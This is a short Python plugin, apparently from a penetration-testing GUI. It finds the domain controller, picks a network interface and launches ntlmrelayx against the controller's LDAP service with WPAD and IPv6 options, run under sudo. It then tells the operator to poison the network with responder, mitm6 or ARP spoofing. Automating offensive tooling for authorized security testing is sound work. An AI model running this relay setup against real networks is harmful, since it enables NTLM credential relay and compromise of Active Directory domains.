import multiprocessing
import subprocess
import psutil
from pollenisatorgui.core.components.logger_config import logger
import pollenisatorgui.core.components.utils as utils
from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
import tempfile
import os
import shutil
import tkinter as tk
from pollenisatorgui.core.components.apiclient import APIClient
from pollenisatorgui.scripts.lan.utils import checkPath, findDc


def main(apiclient, appli, **kwargs):
    res, path = checkPath(["ntlmrelayx.py", "ntlmrelayx"])
    if not res:
        return False, path
    APIClient.setInstance(apiclient)
    res, dc = findDc(apiclient)
    if not res:
        return False, dc
    addrs = psutil.net_if_addrs()
    dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
    dialog.app.wait_window(dialog.app)
    if dialog.rvalue is None:
        return False, "No ethernet device chosen"
    my_ip = addrs[dialog.rvalue][0].address
    cmd = f"{path} -t ldap://{dc} -smb2support -wh {my_ip} -6" 
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx to ldapr", cmd, use_pollex=False)
    return True, f"Relaying is set up, poison the network using responder, mitm6, arp spoofing, etc."
